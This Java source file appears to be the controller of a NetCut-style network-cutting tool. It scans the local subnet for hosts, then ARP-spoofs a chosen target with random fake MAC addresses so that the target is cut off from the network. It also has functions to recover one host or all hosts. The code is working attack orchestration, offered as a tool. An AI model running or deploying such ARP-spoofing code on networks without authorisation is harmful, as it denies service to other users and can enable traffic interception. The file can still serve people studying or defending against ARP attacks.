package org.guercifzone.Models;



import org.guercifzone.Utils.MacUtils;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class Controller {
    private NetworkScanner scanner;
    private Set<Host> hosts;
    private Map<Host, ARP> arp;
    private Map<Host, String> fake_mac_address;
    private int attack_interval_ms;

    public Controller(int attack_interval_ms) {
        this.attack_interval_ms = attack_interval_ms;
        this.scanner = new NetworkScanner();
        this.hosts = Collections.synchronizedSet(new TreeSet<>());
        this.arp = new ConcurrentHashMap<>();
        this.fake_mac_address = new ConcurrentHashMap<>();
    }

    public void scan_targets() {
        try {
            List<Host> active_hosts = scanner.scan_networks();
            hosts.clear();
            hosts.addAll(active_hosts);
            System.out.println("Found " + hosts.size() + " hosts on network");
        } catch (Exception e) {
            System.err.println("Network scan failed: " + e.getMessage());
        }
    }

    public Set<Host> getHosts() {
        return Collections.unmodifiableSet(hosts);
    }

    public void show_targets() {
        scan_targets();
        // Display will be handled by GUI
    }

    public List<Integer> get_targets() {
        // GUI handles target selection
        return new ArrayList<>();
    }

    public void action(int index) {
        try {
            index--;
            if (index < 0 || index >= hosts.size()) {
                System.err.println("Invalid target index: " + (index + 1));
                return;
            }

            // Convert set to list to access by index
            List<Host> hostList = new ArrayList<>(hosts);
            Host target = hostList.get(index);

            System.out.println("Performing action on: " + target.get_ip() +
                    " (current status: " + (target.is_cut() ? "CUT" : "NORMAL") + ")");

            if (target.is_cut()) {
                recover(target);
            } else {
                attack(target);
            }
        } catch (Exception e) {
            System.err.println("Action failed: " + e.getMessage());
        }
    }

    public void attack(Host target) {
        try {
            Interface interface_ = scanner.get_interface_by_ip(target.get_ip());
            if (interface_ == null || interface_.get_ip().isEmpty()) {
                System.err.println("Could not find interface for IP: " + target.get_ip());
                return;
            }

            for (Host host : hosts) {
                if (host.get_ip().equals(target.get_ip()) || !interface_.is_same_subnet(host.get_ip())) {
                    continue;
                }

                if (!arp.containsKey(target)) {
                    arp.put(target, new ARP(interface_));
                }

                if (!fake_mac_address.containsKey(host)) {
                    fake_mac_address.put(host, get_fake_mac_address());
                }

                arp.get(target).spoof(target, host, attack_interval_ms, fake_mac_address.get(host));
            }
            target.set_status(Status.CUT);
            System.out.println("Attack started on: " + target.get_ip());

        } catch (Exception e) {
            System.err.println("Attack failed: " + e.getMessage());
        }
    }

    public void recover(Host target) {
        try {
            Interface interface_ = scanner.get_interface_by_ip(target.get_ip());
            if (interface_ == null || interface_.get_ip().isEmpty()) {
                System.err.println("Could not find interface for IP: " + target.get_ip());
                return;
            }

            for (Host host : hosts) {
                if (host.get_ip().equals(target.get_ip()) || !interface_.is_same_subnet(host.get_ip())) {
                    continue;
                }

                if (arp.containsKey(target)) {
                    arp.get(target).recover(target, host);
                }
            }
            target.set_status(Status.NORMAL);
            System.out.println("Recovery completed for: " + target.get_ip());

        } catch (Exception e) {
            System.err.println("Recovery failed: " + e.getMessage());
        }
    }

    public void recover_all_hosts() {
        System.out.println("Recovering all hosts...");
        for (Host host : hosts) {
            if (host.is_cut()) {
                recover(host);
            }
        }
    }

    public String get_fake_mac_address() {
        return MacUtils.get_random_mac_address();
    }
}